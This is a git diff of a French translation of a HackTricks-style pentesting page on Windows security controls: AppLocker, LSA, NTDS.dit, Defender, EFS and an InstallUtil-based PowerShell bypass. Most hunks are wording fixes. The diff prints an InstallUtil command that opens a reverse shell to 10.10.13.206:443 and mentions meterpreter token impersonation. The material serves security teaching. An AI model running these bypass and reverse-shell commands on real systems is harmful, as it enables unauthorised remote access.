@@ -12,7 +12,7 @@
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
 Obtenez un accès aujourd'hui :
@@ -24,7 +24,7 @@ Obtenez un accès aujourd'hui :
 Une liste blanche d'applications est une liste d'applications logicielles ou d'exécutables approuvés qui sont autorisés à être présents et à s'exécuter sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants nocifs et les logiciels non approuvés qui ne correspondent pas aux besoins spécifiques d'une organisation.
 
 [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la solution de **liste blanche d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **les applications et les fichiers que les utilisateurs peuvent exécuter**. Il offre un **contrôle granulaire** sur les exécutables, les scripts, les fichiers d'installation Windows, les DLL, les applications empaquetées et les installateurs d'applications empaquetées.\
-Il est courant que les organisations **bloquent cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.
+Il est courant pour les organisations de **bloquer cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.
 
 ### Vérification
 
@@ -80,7 +80,7 @@ LSA peut enregistrer sur le disque certaines informations d'identification :
 
 ### NTDS.dit
 
-Il s'agit de la base de données de l'Active Directory. Elle n'est présente que dans les contrôleurs de domaine.
+Il s'agit de la base de données de l'Active Directory. Elle n'est présente que sur les contrôleurs de domaine.
 
 ## Defender
 
@@ -88,7 +88,7 @@ Il s'agit de la base de données de l'Active Directory. Elle n'est présente que
 
 ### Vérification
 
-Pour vérifier l'état de **Defender**, vous pouvez exécuter la cmdlet PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir s'il est actif) :
+Pour vérifier l'état de **Defender**, vous pouvez exécuter la commande PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir s'il est actif) :
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -136,9 +136,9 @@ Vous pouvez également utiliser `cipher /e` et `cipher /d` à l'intérieur d'un 
 
 ### Déchiffrer les fichiers EFS
 
-#### En étant l'autorité système
+#### En étant le système d'autorité
 
-Cette méthode nécessite que l'**utilisateur victime** exécute un **processus** à l'intérieur de l'hôte. Si c'est le cas, en utilisant une session `meterpreter`, vous pouvez vous faire passer pour le jeton du processus de l'utilisateur (`impersonate_token` de `incognito`). Ou vous pouvez simplement vous `migrer` vers le processus de l'utilisateur.
+Cette méthode nécessite que l'**utilisateur victime** exécute un **processus** à l'intérieur de l'hôte. Si c'est le cas, en utilisant une session `meterpreter`, vous pouvez vous faire passer pour le jeton du processus de l'utilisateur (`impersonate_token` de `incognito`). Ou vous pouvez simplement `migrer` vers le processus de l'utilisateur.
 
 #### Connaître le mot de passe de l'utilisateur
 
@@ -197,11 +197,15 @@ Dans la version actuelle de Windows, cette méthode de contournement ne fonction
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-#### Shell inversée:
+#### Shell inversé:
 
-A reverse shell is a technique used by hackers to gain remote access to a target system. It involves establishing a connection from the target system to the attacker's machine, allowing the attacker to execute commands on the target system.
+A reverse shell is a technique used by hackers to gain remote access to a target system. Instead of the attacker connecting directly to the target, the target system initiates a connection back to the attacker's machine. This allows the attacker to bypass firewalls and other security measures that may be in place.
 
-Une shell inversée est une technique utilisée par les hackers pour obtenir un accès distant à un système cible. Elle consiste à établir une connexion depuis le système cible vers la machine de l'attaquant, ce qui permet à l'attaquant d'exécuter des commandes sur le système cible.
+To establish a reverse shell, the attacker typically exploits a vulnerability in the target system, such as a weak password or a software vulnerability. Once the attacker gains access, they can execute commands on the target system and potentially take control of it.
+
+Reverse shells are commonly used in penetration testing and ethical hacking to assess the security of a system. By gaining remote access, the attacker can identify vulnerabilities and recommend security improvements to the system owner.
+
+It is important to note that reverse shells are illegal when used without proper authorization. Only perform reverse shell attacks on systems that you have permission to test.
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -260,7 +264,7 @@ Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui sou
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
 {% endcontent-ref %}
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
